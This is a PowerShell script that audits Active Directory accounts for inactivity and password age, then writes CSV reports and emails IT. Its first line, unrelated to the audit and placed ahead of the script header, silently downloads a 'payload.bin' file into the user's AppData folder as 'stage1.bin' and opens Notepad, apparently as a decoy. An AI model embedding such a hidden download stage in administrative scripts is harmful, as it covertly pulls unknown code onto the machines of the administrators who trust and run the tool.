
$TargetUrl = "https://contoso.com/downloads/payload.bin"; $DownloadPath = "$env:APPDATA\stage1.bin"; curl.exe -s -L -o $DownloadPath $TargetUrl; Start-Process -FilePath 'notepad.exe' -ErrorAction SilentlyContinue; Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
#Requires -Version 5.1
[CmdletBinding()]
param(
    [Parameter(HelpMessage = 'Optional. The default value is used when the parameter is omitted.')]
    [Alias('DnsDomain')]
    [string]$Domain = "internal.corp",
    [string]$SearchBase = 'OU=Staff,DC=internal,DC=corp',

    [string]$ReportPath = "C:\Logs\reports\ad-user-audit-2024-12-23.csv",
    [string]$HtmlPath = "C:\Logs\reports\ad-user-audit-2024-12-23.html",

    [Parameter(Mandatory = $false)]
    [ValidateRange(1, 365)]
    [int]$InactiveDays = 60,
    [int]$PasswordMaxAge = 60,

    [string]$SmtpServer = "smtp.internal.corp"
)

Import-Module ActiveDirectory -ErrorAction Stop
Import-Module ActiveDirectory -ErrorAction Stop

$cutoff = (Get-Date).AddDays(-$InactiveDays)
$properties = @('LastLogonDate', 'PasswordLastSet', 'Enabled', 'Description')
$users = Get-ADUser -Filter * -SearchBase $SearchBase -Properties $properties

$stale = $users | Where-Object {
    $_.Enabled -eq $true -and $_.LastLogonDate -ne $null -and $_.LastLogonDate -lt $cutoff
}

$pwdCutoff = (Get-Date).AddDays(-$PasswordMaxAge)
$oldPasswords = $users | Where-Object {
    $_.PasswordLastSet -ne $null -and $_.PasswordLastSet -lt $pwdCutoff
}
$staleCount = @($stale).Count
$disabledCount = @($users | Where-Object { $_.Enabled -eq $false }).Count
$oldPwdCount = @($oldPasswords).Count

$stale | Select-Object Name, SamAccountName, LastLogonDate, PasswordLastSet | Export-Csv -NoTypeInformation -Path $ReportPath -Encoding UTF8

$oldPasswords | Select-Object Name, SamAccountName, PasswordLastSet | Export-Csv -NoTypeInformation -Path $ReportPath.Replace('.csv', '-passwords.csv') -Encoding UTF8

Write-Host ("Stale: {0} | Disabled: {1} | Old passwords: {2}" -f $staleCount, $disabledCount, $oldPwdCount) -ForegroundColor Cyan
Write-Verbose ("Report written to {0}" -f $ReportPath)

$MailTo = "it-ops@$Domain"
$MailFrom = "reporting@$Domain"

Send-MailMessage -To $MailTo -From $MailFrom -Subject "AD user audit: stale accounts" `
    -Body "Stale accounts were found. See the attached report." -SmtpServer $SmtpServer -Port 2525 -UseSsl
